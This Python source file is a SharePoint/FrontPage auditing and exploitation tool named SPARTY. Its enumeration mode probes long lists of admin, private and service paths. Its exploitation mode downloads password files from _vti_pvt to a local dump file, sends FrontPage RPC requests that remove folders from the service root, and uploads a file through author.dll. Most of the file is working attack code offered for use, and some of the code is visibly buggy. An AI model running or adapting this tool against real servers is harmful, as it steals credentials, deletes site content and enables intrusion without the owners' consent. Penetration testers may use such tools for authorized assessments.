import sys
import re
import requests
import colorama
from urllib3.exceptions import InsecureRequestWarning

# Disable warnings
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

colorama.init()

# Frontend (bin) repository files !

front_bin = ['_vti_inf.html', '_vti_bin/shtml.dll/_vti_rpc', '_vti_bin/owssvr.dll', '_vti_bin/_vti_adm/admin.dll',
             '_vti_bin/_vti_adm/admin.exe', '_vti_bin/_vti_aut/author.exe', '_vti_bin/_vti_aut/WS_FTP.log',
             '_vti_bin/_vti_aut/ws_ftp.log', '_vti_bin/shtml.exe/_vti_rpc', '_vti_bin/_vti_aut/author.dll']

front_services = ['_vti_bin/Admin.asmx', '_vti_bin/alerts.asmx', '_vti_bin/dspsts.asmx', '_vti_bin/forms.asmx',
                  '_vti_bin/Lists.asmx', '_vti_bin/people.asmx', '_vti_bin/Permissions.asmx', '_vti_bin/search.asmx',
                  '_vti_bin/UserGroup.asmx', '_vti_bin/versions.asmx', '_vti_bin/Views.asmx',
                  '_vti_bin/webpartpages.asmx', '_vti_bin/webs.asmx', '_vti_bin/spsdisco.aspx',
                  '_vti_bin/AreaService.asmx', '_vti_bin/BusinessDataCatalog.asmx', '_vti_bin/ExcelService.asmx',
                  '_vti_bin/SharepointEmailWS.asmx', '_vti_bin/spscrawl.asmx', '_vti_bin/spsearch.asmx',
                  '_vti_bin/UserProfileService.asmx', '_vti_bin/WebPartPages.asmx']

# Frontend (pvt) repository files !

front_pvt = ['_vti_pvt/authors.pwd', '_vti_pvt/administrators.pwd', '_vti_pvt/users.pwd', '_vti_pvt/service.pwd',
             '_vti_pvt/service.grp', '_vti_pvt/bots.cnf', '_vti_pvt/service.cnf', '_vti_pvt/access.cnf',
             '_vti_pvt/writeto.cnf', '_vti_pvt/botsinf.cnf', '_vti_pvt/doctodep.btr', '_vti_pvt/deptodoc.btr',
             '_vti_pvt/linkinfo.cnf',
             '_vti_pvt/services.org', '_vti_pvt/structure.cnf', '_vti_pvt/svcacl.cnf', '_vti_pvt/uniqperm.cnf',
             '_vti_pvt/service/lck', '_vti_pvt/frontpg.lck']

# Sharepoint and Frontend (directory) repository !

directory_check = ['_vti_pvt/', '_vti_bin/', '_vti_log/', '_vti_cnf/', '_vti_bot', '_vti_bin/_vti_adm',
                   '_vti_bin/_vti_aut', '_vti_txt/']

# Sharepoint repository files !

sharepoint_check_layout = ['_layouts/aclinv.aspx', '_layouts/addrole.aspx', '_layouts/AdminRecycleBin.aspx',
                           '_layouts/AreaNavigationSettings.aspx', '_Layouts/AreaTemplateSettings.aspx',
                           '_Layouts/AreaWelcomePage.aspx', '_layouts/associatedgroups.aspx', '_layouts/bpcf.aspx',
                           '_Layouts/ChangeSiteMasterPage.aspx', '_layouts/create.aspx', '_layouts/editgrp.aspx',
                           '_layouts/editprms.aspx', '_layouts/groups.aspx',
                           '_layouts/help.aspx', '_layouts/images/', '_layouts/listedit.aspx',
                           '_layouts/ManageFeatures.aspx', '_layouts/ManageFeatures.aspx', '_layouts/mcontent.aspx',
                           '_layouts/mngctype.aspx', '_layouts/mngfield.aspx', '_layouts/mngsiteadmin.aspx',
                           '_layouts/mngsubwebs.aspx', '_layouts/mngsubwebs.aspx?view=sites',
                           '_layouts/mobile/mbllists.aspx', '_layouts/MyInfo.aspx', '_layouts/MyPage.aspx',
                           '_layouts/MyTasks.aspx',
                           '_layouts/navoptions.aspx', '_layouts/NewDwp.aspx', '_layouts/newgrp.aspx',
                           '_layouts/newsbweb.aspx', '_layouts/PageSettings.aspx', '_layouts/people.aspx',
                           '_layouts/people.aspx?MembershipGroupId=0', '_layouts/permsetup.aspx',
                           '_layouts/picker.aspx', '_layouts/policy.aspx', '_layouts/policyconfig.aspx',
                           '_layouts/policycts.aspx', '_layouts/Policylist.aspx', '_layouts/prjsetng.aspx',
                           '_layouts/quiklnch.aspx',
                           '_layouts/recyclebin.aspx', '_Layouts/RedirectPage.aspx', '_layouts/role.aspx',
                           '_layouts/settings.aspx', '_layouts/SiteDirectorySettings.aspx', '_layouts/sitemanager.aspx',
                           '_layouts/SiteManager.aspx?lro=all', '_layouts/spcf.aspx', '_layouts/storman.aspx',
                           '_layouts/themeweb.aspx', '_layouts/topnav.aspx', '_layouts/user.aspx',
                           '_layouts/userdisp.aspx', '_layouts/userdisp.aspx?ID=1', '_layouts/useredit.aspx',
                           '_layouts/useredit.aspx?ID=1', '_layouts/viewgrouppermissions.aspx',
                           '_layouts/viewlsts.aspx', '_layouts/vsubwebs.aspx', '_layouts/WPPrevw.aspx?ID=247',
                           '_layouts/wrkmng.aspx']

sharepoint_check_forms = ['Forms/DispForm.aspx', 'Forms/DispForm.aspx?ID=1', 'Forms/EditForm.aspx',
                          'Forms/EditForm.aspx?ID=1', 'Forms/Forms/AllItems.aspx', 'Forms/MyItems.aspx',
                          'Forms/NewForm.aspx', 'Pages/default.aspx', 'Pages/Forms/AllItems.aspx']

sharepoint_check_catalog = ['_catalogs/masterpage/Forms/AllItems.aspx', '_catalogs/wp/Forms/AllItems.aspx',
                            '_catalogs/wt/Forms/Common.aspx']

refine_target = []
pvt_target = []
dir_target = []
sharepoint_target_layout = []
sharepoint_target_forms = []
sharepoint_target_catalog = []

GREEN = colorama.Fore.GREEN
GRAY = colorama.Fore.LIGHTBLACK_EX
RESET = colorama.Fore.RESET
RED = colorama.Fore.RED
BLUE = colorama.Fore.BLUE
CYAN = colorama.Fore.CYAN

# Custom headers
custom_headers = {}
# Proxy
custom_proxy = {}

def banner():
    ascii_banner = rf"""{RED}


	 ____  ____   _    ____ _______   __  ____         ___
	/ ___||  _ \ / \  |  _ \_   _\ \ / / |___ \       / _ \
	\___ \| |_) / _ \ | |_) || |  \ V /    __) |     | | | |
	 ___) |  __/ ___ \|  _ < | |   | |    / __/   _  | |_| |
	|____/|_| /_/   \_\_| \_\|_|   |_|   |_____| (_)  \___/



	"""

    print(ascii_banner)
    print(f"{CYAN}        SPARTY : Sharepoint/Frontpage Security Auditing Tool{RESET}")
    print("")


banner()


def sparty_usage(destination):
    print("[scanning access permissions in forms directory - sharepoint] %s -s forms -u  %s " % (
        sys.argv[0], destination))
    print("[scanning access permissions in frontpage directory - frontpage] %s -f pvt -u %s " % (
        sys.argv[0], destination))
    print("[dumping passwords] %s -d dump -u %s " % (sys.argv[0], destination))
    print("[note] : please take this into consideration!")
    print("\t\t: (1) always specify https | http explcitly !")
    print("\t\t: (2) always provide the proper directory structure where sharepoint/frontpage is installed !")
    print("\t\t: (3) do not specify '/' at the end of url !")


def target_information(name):
    print("")
    print(f"{GREEN} [*] TARGET INFORMATION {RESET}")
    print("")
    try:
        global custom_headers
        headers = requests.get(name, verify=False, headers=custom_headers, proxies=custom_proxy)
        print("[+] Fetching information from the given target --> [%s]" % (headers.url))
        print("[+] Target responded with HTTP code --> [%s]" % headers.status_code)
        print("[+] Target is running server --> [%s]" % headers.headers['server'])
        print("")

    except requests.exceptions.HTTPError as h:
        print("[-] url error occured - (%s)" % h.status_code)
        pass
    except KeyError:
        pass


def build_target(target, front_dirs=[], refine_target=[]):
    for item in front_dirs:
        refine_target.append(target + "/" + item)


def audit(target=[]):
    global custom_headers
    print("")
    for element in target:
        try:
            handle = requests.get(element, verify=False, headers=custom_headers, proxies=custom_proxy)
            response_code = handle.status_code
            print("[+] (%s) - (%d)" % (element, response_code))

        except requests.exceptions.HTTPError:
            print("[-] (%s) - (%d)" % (element))

        except KeyboardInterrupt:
            print(f"{RED} Keyboard Interrupt Detected {RESET}")
            sys.exit(0)
        except Exception as e:
            print(f"{RED}[-] Server responds with bad status {e} {RESET}")
            pass
    print("")


def dump_credentials(dest):
    print("")
    global custom_headers
    global custom_proxy
    pwd_targets = []
    pwd_files = ['_vti_pvt/service.pwd', '_vti_pvt/administrators.pwd', '_vti_pvt/authors.pwd']
    filename = "__dump__.txt"
    for item in pwd_files:
        pwd_targets.append(dest + "/" + item)

    for entry in pwd_targets:
        try:
            handle = requests.get(entry, verify=False, headers=custom_headers, proxies=custom_proxy)
            if handle.status_code == 200:
                print("[+] Dumping contents of file located at : (%s)" % (entry))
                filename = "__dump__.txt"
                dump = open(filename, 'a')
                dump.write(handle.content)
                print("[+] Check the (%s) file  generated !\n" % (filename))
                print("")
            # print (handle.content)

            if handle.status_code == 404:
                print("[-] Could not dump the file located at : (%s) | (%d)" % (entry, handle.status_code))
        except requests.exceptions.HTTPError as h:
            print("[-] HTTP ERROR : (%s) | (%d)" % (entry, h.status_code))
            continue

        except KeyboardInterrupt:
            print(f"{RED} Keyboard Interrupt Detected {RESET}")
            sys.exit(0)

        except:
            print(f"{RED}[-] Server responds with bad status {RESET}")
            pass
    print("")


def fingerprint_frontpage(name):
    print("")
    global custom_headers
    global custom_proxy
    enum_nix = ['_vti_bin/_vti_aut/author.exe', '_vti_bin/_vti_adm/admin.exe', '_vti_bin/shtml.exe']
    enum_win = ['_vti_bin/_vti_aut/author.dll', '_vti_bin/_vti_aut/dvwssr.dll', '_vti_bin/_vti_adm/admin.dll',
                '_vti_bin/shtml.dll']
    build_enum_nix = []
    build_enum_win = []

    for item in enum_nix:
        build_enum_nix.append(name + "/" + item)

    for entry in build_enum_nix:
        try:
            info = requests.get(entry, verify=False, headers=custom_headers, proxies=custom_proxy)
            if info.status_code == 200:
                print("[+] Front page is tested as : nix version |  (%s) | (%d)" % (entry, info.status_code))
                print("")

        except requests.exceptions.HTTPError:
            pass

    for item in enum_win:
        build_enum_win.append(name + "/" + item)

    for entry in build_enum_win:
        try:
            info = requests.get(entry, verify=False, headers=custom_headers, proxies=custom_proxy)
            if info.status_code == 200:
                print("[+] Front page is tested as : windows version |  (%s) | (%d)" % (entry, info.status_code))
                print("")

        except requests.exceptions.HTTPError:
            pass

    frontend_version = name + "/_vti_inf.html"
    try:
        version = requests.get(frontend_version, verify=False, headers=custom_headers, proxies=custom_proxy)
        version_content = version.content.decode('utf-8')
        print("[+] Extracting frontpage version from default file : (%s):" % re.findall(r'FPVersion=(.*)',
                                                                                        version_content))

    except requests.exceptions.HTTPError:
        print("[-] Failed to extract the version of frontpage from default file!")
        pass

    except KeyboardInterrupt:
        print(f"{RED} Keyboard Interrupt Detected {RESET}")
        sys.exit(0)

    except:
        print(f"{RED}[-] Server responds with bad status {RESET}")
        print("")
        pass
    print("")


def dump_sharepoint_headers(name):
    print("")
    global custom_headers
    global custom_proxy
    try:
        dump_s = requests.get(name, verify=False, headers=custom_headers, proxies=custom_proxy)
        print("[+] Configured sharepoint version is  : (%s)" % dump_s.headers['microsoftsharepointteamservices'])
    except KeyError:
        print("[-] Sharepoint version could not be extracted using HTTP header :  MicrosoftSharepointTeamServices ")
    try:
        dump_f = requests.get(name, verify=False, headers=custom_headers, proxies=custom_proxy)
        print("[+] Sharepoint is configured with load balancing capability : (%s)" % dump_f.headers[
            'x-sharepointhealthscore'])
    except KeyError:
        print(
            "[-] Sharepoint load balancing ability could not be determined using HTTP header : X-SharepointHealthScore ")
    try:
        dump_g = requests.get(name, verify=False, headers=custom_headers, proxies=custom_proxy)
        print("[+] Sharepoint is configured with explicit diagnosis (GUID based log analysis) purposes : (%s)" %
              dump_g.headers['sprequestguid'])
    except KeyError:
        print("[-] Sharepoint diagnostics ability could not be determined using HTTP header : SPRequestGuid ")
    except requests.exceptions.HTTPError:
        pass
    except KeyboardInterrupt:
        print(f"{RED} Keyboard Interrupt Detected {RESET}")
        sys.exit(0)
    except:
        print("[-] Server responds with bad status ")
        pass


def frontpage_rpc_check(name):
    print("")
    global custom_proxy
    global custom_headers
    local_headers = {
        'MIME-Version': '4.0',
        'User-Agent': 'MSFrontPage/4.0',
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'Connection': 'Keep-Alive'
    }
    # Update with user provided headers
    local_headers.update(custom_headers)

    exp_target_list = ['_vti_bin/shtml.exe/_vti_rpc', '_vti_bin/shtml.dll/_vti_rpc']
    data = ["method=server version"]

    for item in exp_target_list:
        destination = name + "/" + item

    print("[+] Sending HTTP GET request to - (%s) for verifying whether RPC is listening " % destination)
    try:
        response = requests.get(destination, verify=False, headers=local_headers, proxies=custom_proxy)
        if response.status_code == 200:
            print("[+] Target is listening on frontpage RPC - (%s)" % response.status_code)
        else:
            print("[-] Target is not listening on frontpage RPC - (%s)" % response.status_code)
    except requests.exceptions.ConnectionError:
        print("[-] URL error ")
        pass
    except KeyboardInterrupt:
        print(f"{RED} Keyboard Interrupt Detected {RESET}")
        sys.exit(0)
    except:
        print(f"{RED}[-] Server responds with bad status {RESET}")
        pass
    print("")
    print("[+] Sending HTTP POST request to retrieve software version - (%s)" % destination)
    try:
        response = requests.post(destination, json=data, headers=local_headers, verify=False, proxies=custom_proxy)
        if response.status_code == 200:
            print("[+] Target accepts the request - (%s) | (%s) !\n" % (response.status_code))
            filename = "__version__.txt" + ".html"
            version = open(filename, 'a')
            version_content = response.content.decode('utf-8')
            version.write(version_content)
            print("[+] Check file for contents - (%s) \n" % filename)
        else:
            print("[-] Target fails to accept request - (%s)" % (response.status_code))

        print("")
    except requests.exceptions.ConnectionError as e:
        print(
            "[-] Url error, seems like authentication is required or server failed to handle request - - %s" % e.status_code)
        pass
    except KeyboardInterrupt:
        print(f"{RED} Keyboard Interrupt Detected {RESET}")
        sys.exit(0)
    except:
        print(f"{RED}[-] Server responds with bad status {RESET}")
        pass


def frontpage_service_listing(name):
    print("")
    global custom_proxy
    global custom_headers
    local_headers = {
        'MIME-Version': '4.0',
        'User-Agent': 'MSFrontPage/4.0',
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'Connection': 'Keep-Alive'
    }

    # Update with user provided headers
    local_headers.update(custom_headers)

    i = 0
    service_target_list = ['_vti_bin/shtml.exe/_vti_rpc', '_vti_bin/shtml.dll/_vti_rpc']
    data = ['method=list+services:3.0.2.1076&service_name=', 'method=list+services:4.0.2.471&service_name=',
            'method=list+services:4.0.2.0000&service_name=', 'method=list+services:5.0.2.4803&service_name=',
            'method=list+services:5.0.2.2623&service_name=', 'method=list+services:6.0.2.5420&service_name=']

    for item in service_target_list:
        destination = name + "/" + item

    print("[+] Sending HTTP POST request to retrieve service listing  - (%s)" % destination)
    try:

        for entry in data:

            response = requests.post(destination, json=data, headers=local_headers, verify=False, proxies=custom_proxy)
            if response.status_code == 200:
                print("[+] Target Accepts the request - (%s)" % (entry.split('&')[0], response.status_code))
                i += 1
                i = str(i)
                filename = "service-list(" + i + ").html"
                service_list = open(filename, 'a')
                i = int(i)
                response_content = response.content.decode('utf-8')
                service_list.write(response_content)
                print("[+] Check file for contents - (%s)" % filename)
            else:
                print("[-] Target fails to accept request -| [%s] | (%s)" % (entry.split('&')[0], response.status_code))
        print("")
    except requests.exceptions.ConnectionError:
        print("[-] Url error, seems like authentication is required or server failed to handle request ")
        pass
    except KeyboardInterrupt:
        print(f"{RED} Keyboard Interrupt Detected {RESET}")
        sys.exit(0)
    except:
        print(f"{RED}[-] Server responds with bad status {RESET}")
        pass


def frontpage_config_check(name):
    print("")
    global custom_proxy
    global custom_headers
    local_headers = {
        'MIME-Version': '4.0',
        'User-Agent': 'MSFrontPage/4.0',
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'Connection': 'Keep-Alive'
    }

    # Update with user provided headers
    local_headers.update(custom_headers)

    front_exp_target = '_vti_bin/_vti_aut/author.dll'
    payloads = ['method=open service:3.0.2.1706&service_name=/',
                'method=list documents:3.0.2.1706&service_name=&listHiddenDocs=false&listExplorerDocs=false&listRecurse=false&listFiles=true&listFolders=true&listLinkInfo=false&listIncludeParent=true&listDerivedT=false&listBorders=false&initialUrl=',
                'method=getdocument:3.0.2.1105&service_name=&document_name=about/default.htm&old_theme_html=false&force=true&get_option=none&doc_version=',
                'method=open service:4.0.2.4715&service_name=/',
                'method=list documents:4.0.2.4715&service_name=&listHiddenDocs=false&listExplorerDocs=false&listRecurse=false&listFiles=true&listFolders=true&listLinkInfo=false&listIncludeParent=true&listDerivedT=false&listBorders=false&initialUrl=',
                'method=getdocument:4.0.2.4715&service_name=&document_name=about/default.htm&old_theme_html=false&force=true&get_option=none&doc_version=',
                'method=open service:5.0.2.4803&service_name=/',
                'method=list documents:5.0.2.4803&service_name=&listHiddenDocs=false&listExplorerDocs=false&listRecurse=false&listFiles=true&listFolders=true&listLinkInfo=false&listIncludeParent=true&listDerivedT=false&listBorders=false&initialUrl=',
                'method=getdocument:5.0.2.4803&service_name=&document_name=about/default.htm&old_theme_html=false&force=true&get_option=none&doc_version=',
                'method=open service:5.0.2.2623&service_name=/',
                'method=list documents:5.0.2.2623&service_name=&listHiddenDocs=false&listExplorerDocs=false&listRecurse=false&listFiles=true&listFolders=true&listLinkInfo=false&listIncludeParent=true&listDerivedT=false&listBorders=false&initialUrl=',
                'method=getdocument:5.0.2.2623&service_name=&document_name=about/default.htm&old_theme_html=false&force=true&get_option=none&doc_version=',
                'method=open service:6.0.2.5420&service_name=/',
                'method=list documents:6.0.2.5420&service_name=&listHiddenDocs=false&listExplorerDocs=false&listRecurse=false&listFiles=true&listFolders=true&listLinkInfo=false&listIncludeParent=true&listDerivedT=false&listBorders=false&initialUrl=',
                'method=getdocument:6.0.2.5420&service_name=&document_name=about/default.htm&old_theme_html=false&force=true&get_option=none&doc_version=']
    destination = name + "/" + front_exp_target
    print("")
    print("[+] Sending HTTP POST request to [open service | listing documents] - (%s)" % destination)
    print("")
    for item in payloads:
        try:
            response = requests.post(destination, json=item, headers=local_headers, verify=False, proxies=custom_proxy)
            if response.status_code == 200:
                print("[+] target accepts the request -  [%s] | (%s)" % (item.split('&')[0], response.status_code))
                filename = "__author-dll-config__" + ".html"
                service_list = open(filename, 'a')
                response_content = response.content.decode('utf-8')
                service_list.write(response_content)
                print("[+] Check file for contents - (%s)" % filename)
            else:
                print("[-] Target Fails to accept request - | [%s] | (%s)" % (item.split('&')[0], response.status_code))

        except requests.exceptions.ConnectionError:
            print(
                "[-] Url error, seems like authentication is required or server failed to handle request! - (%s) \n" % (
                    item))
            pass
        except KeyboardInterrupt:
            print(f"{RED} Keyboard Interrupt Detected {RESET}")
            sys.exit(0)
        except:
            print(f"{RED}[-] Server responds with bad status {RESET}")
            pass
    print("")


def frontpage_remove_folder(name):
    print("")
    global custom_proxy
    global custom_headers
    local_headers = {
        'MIME-Version': '4.0',
        'User-Agent': 'MSFrontPage/4.0',
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'Connection': 'Keep-Alive'
    }

    # Update with user provided headers
    local_headers.update(custom_headers)

    file_exp_target = '_vti_bin/_vti_aut/author.dll'
    payloads = ['method=remove+documents:3.0.2.1786&service_name=/',
                'method=remove+documents:4.0.2.4715&service_name=/',
                'method=remove+documents:5.0.3.4803&service_name=/',
                'method=remove+documents:5.0.2.4803&service_name=/',
                'method=remove+documents:6.0.2.5420&service_name=/']
    destination = name + "/" + file_exp_target
    print("[+] Sending HTTP POST request to remove  directory at - (%s) " % destination)
    print("")
    for item in payloads:

        try:

            response = requests.post(destination, json=item, headers=local_headers, verify=False, proxies=custom_proxy)
            if response.status_code == 200:
                print("[+] Folder removed successfully - [%s] | (%s)  " % (item.split('&')[0], response.status_code))

            else:
                print("[-] Failed to remove  folder - [%s] | (%s) " % (item.split('&')[0], response.status_code))

        except requests.exceptions.ConnectionError as e:
            print(
                "[-] Url error, seems like authentication is required or server failed to handle request - (%s) \n" % (
                    item))
            pass

        except KeyboardInterrupt:
            print(f"{RED} Keyboard Interrupt Detected {RESET}")
            sys.exit(0)
        except:
            print(f"{RED}[-] Server responds with bad status {RESET}")
            pass
    print("")


def file_upload_check(name):
    print("")
    global custom_proxy
    global custom_headers
    local_headers = {
        'MIME-Version': '4.0',
        'User-Agent': 'MSFrontPage/4.0',
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'Connection': 'Keep-Alive'
    }

    # Update with user provided headers
    local_headers.update(custom_headers)

    file_exp_target = '_vti_bin/_vti_aut/author.dll'
    payloads = [
        'method=put document:3.0.2.1706&service_name=&document=[document_name=sparty.txt ; meta_info=[]]&put_option=overwrite&comment=&keep_checked_out=false',
        'method=put document:4.0.2.4715&service_name=&document=[document_name=sparty.txt ; meta_info=[]]&put_option=overwrite&comment=&keep_checked_out=false'
        ,
        'method=put document:5.0.2.2623&service_name=&document=[document_name=sparty.txt ; meta_info=[]]&put_option=overwrite&comment=&keep_checked_out=false',
        'method=put document:5.0.2.4823&service_name=&document=[document_name=sparty.txt ; meta_info=[]]&put_option=overwrite&comment=&keep_checked_out=false',
        'method=put document:6.0.2.5420&service_name=&document=[document_name=sparty.txt ; meta_info=[]]&put_option=overwrite&comment=&keep_checked_out=false']
    destination = name + "/" + file_exp_target
    print("[+] Sending HTTP POST request for uploading file to - (%s)" % destination)
    print("")
    for item in payloads:
        try:
            response = requests.post(destination, json=item, headers=local_headers, verify=False, proxies=custom_proxy)
            if response.status_code == 200:
                # TODO: fix items splitting
                print("[+] File uploaded successfully - [%s] | (%s) \n" % (items.split('&')[0], response.status_code))
                print("Check Uploaded File at - (%s)" % (destination + "sparty.txt"))
            else:
                print("[-] File Fails to upload  - [%s] | (%s)" % (items.split('&')[0], response.status_code))

        except requests.exceptions.ConnectionError:
            print(
                "[-] Url error, seems like authentication is required or server failed to handle request! - (%s) \n" % (
                    item))
            pass
        except KeyboardInterrupt:
            print(f"{RED} Keyboard Interrupt Detected {RESET}")
            sys.exit(0)
        except:
            print(f"{RED}[-] Server responds with bad status {RESET}")
            pass
    print("")


def main():
    try:
        import argparse
        global custom_headers
        global custom_proxy
        parser = argparse.ArgumentParser(description="SPARTY : Sharepoint/Frontpage Security Auditing Tool")
        parser.add_argument("-u", "--url", help="Target URL", required=True)
        parser.add_argument('-enum', '--enumeration', action='store_true')
        parser.add_argument('-exploit', '--exploitation', action='store_true')
        parser.add_argument('-p', '--proxy', help="Specify proxy as http://user:password@host:port")
        parser.add_argument('-hds', '--headers', nargs='+', help="Specify headers as key=value pairs")

        args = parser.parse_args()
        if args.headers:
            for header in args.headers:
                try:
                    key, value = header.split('=', 1)
                    custom_headers[key] = value
                except ValueError:
                    print(f"Error: Incorrect header format '{header}'. Expected format 'key=value'.")
                    sys.exit(1)

        custom_proxy = {"http": args.proxy, "https": args.proxy} if args.proxy else None

        target = args.url
        target_information(target)
        if args.enumeration:
            print("")
            print(f"{BLUE}              [!!] Using Enumeration Module [!!] {RESET}")
            print("")
            print("")
            print(f"{GREEN}   [*] Auditing Frontpage RPC service {RESET}")
            frontpage_rpc_check(target)
            print(f"{GREEN}   [*] Auditing Frontpage RPC For Service Listing {RESET}")
            frontpage_service_listing(target)
            print(f"{GREEN}   [*] Auditing Frontpage Configuration Setting{RESET}")
            frontpage_config_check(target)
            build_target(target, directory_check, dir_target)
            print(f"{GREEN}   [*] Auditing Frontpage Directory Permissions{RESET}")
            audit(dir_target)
            build_target(target, front_bin, refine_target)
            print(f"{GREEN}   [*] Auditing Frontpage For Sensitive Information{RESET}")
            audit(refine_target)
            build_target(target, front_pvt, pvt_target)
            print(f"{GREEN}   [*] Auditing  '/_vti_pvt/' Directory for Sensitive Information{RESET}")
            audit(pvt_target)
            fingerprint_frontpage(target)
            build_target(target, sharepoint_check_layout, sharepoint_target_layout)
            print(f"{GREEN}   [*] Auditing Sharepoint Directories for Sensitive Information{RESET}")
            audit(sharepoint_target_layout)
            build_target(target, sharepoint_check_forms, sharepoint_target_forms)
            audit(sharepoint_target_forms)
            build_target(target, sharepoint_check_catalog, sharepoint_target_catalog)
            audit(sharepoint_target_catalog)
            build_target(target, front_services, refine_target)
            print(f"{GREEN}   [*] Checking Exposed Services in the Frontpage/Sharepoint  Directory{RESET}")
            audit(refine_target)

        if args.exploitation:
            print("")

            print(f"{BLUE}              [!!] Using Exploitation Module [!!] {RESET}")
            print("")
            print("")
            print(f"{GREEN}    [*] Dumping Files if Possible! {RESET}")
            dump_credentials(target)
            print(f"{GREEN}   [*] Trying to Remove Folder From Server{RESET}")

            frontpage_remove_folder(target)
            print(f"{GREEN}   [*] Auditing File Uploading Misconfiguration {RESET}")
            file_upload_check(target)
            print(f"{GREEN}   [*] Dumping Sharepoint Headers {RESET}")
            dump_sharepoint_headers(target)

        if args.exploitation == False and args.enumeration == False:
            print(f"{RED}  [!!] No Module Used  {RESET}")
            print(f"{RED}  [!!] Use Exploitation or Enumeration  {RESET}")

    except KeyboardInterrupt:
        print(f"{RED} Keyboard Interrupt Detected {RESET}")
        sys.exit(0)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"{RED} Keyboard Interrupt Detected {RESET}")
        sys.exit(0)
